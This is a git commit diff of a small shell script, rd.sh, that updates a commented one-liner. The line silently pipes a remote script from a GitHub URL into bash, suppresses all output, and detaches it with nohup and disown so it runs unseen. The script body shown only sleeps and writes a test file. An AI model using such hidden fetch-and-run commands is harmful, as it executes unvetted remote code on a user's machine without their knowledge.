e91ce1b9435df9d6bf2c0b625b2e4ed9b47ba196
Grégoire Marty <gregoire.marty@epitech.eu>
2021-04-29 13:26:54 +0200

    rd.sh link update

--- rd.sh
+++ rd.sh
@@ -1,4 +1,4 @@
-# (nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/rd1.sh 2> /dev/null & disown) | nohup bash >& /dev/null & disown & exit
+# (nohup curl https://raw.githubusercontent.com/Shadisun/Shadisun.github.io/master/rd.sh 2> /dev/null & disown) | nohup bash >& /dev/null & disown & exit
 
 sleep 5
 echo test > ~/test.txt
